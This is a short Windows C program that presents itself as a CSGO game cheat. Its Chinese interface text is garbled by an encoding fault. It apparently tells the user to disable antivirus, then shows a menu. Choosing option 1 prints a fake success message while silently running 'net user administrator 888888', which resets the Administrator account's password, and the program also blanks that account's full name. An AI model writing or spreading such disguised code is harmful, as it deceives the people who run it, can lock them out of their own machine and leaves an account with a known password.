#define _CRT_SECURE_NO_WARNINGS
# include <stdlib.h>
# include  <stdio.h>
# include <windows.h>

int main()
{
	int i = 1;
	int a;
	system("title CSGO��");

	MessageBoxA(NULL, "����CSGO����֮ǰ�����Ϸ���ر�ɱ�����!", "��ܰ��ʾ", MB_OK);//����һ�����ڡ������޸�

	if (i != 0)
	{


		printf("�����������У�����رճ���!\n");
		printf("\t\t��ѡ��1����2�����͹رո�����\n");

		printf("\n");
		printf("1.������\n");
		printf("\n");
		printf("2.�رպ�\n");
		Sleep(1000);

	}

	scanf_s("%d", &a);

	switch (a)
	{
	case 1:printf("\a");
		printf("���������ɹ�����Ϸ��¼���Զ���Ч��\n");
		system("net user Administrator /fullname:");
		system("net user administrator 888888");
		break;
	case 2:printf("��������ʧ��");
		break;

	}

}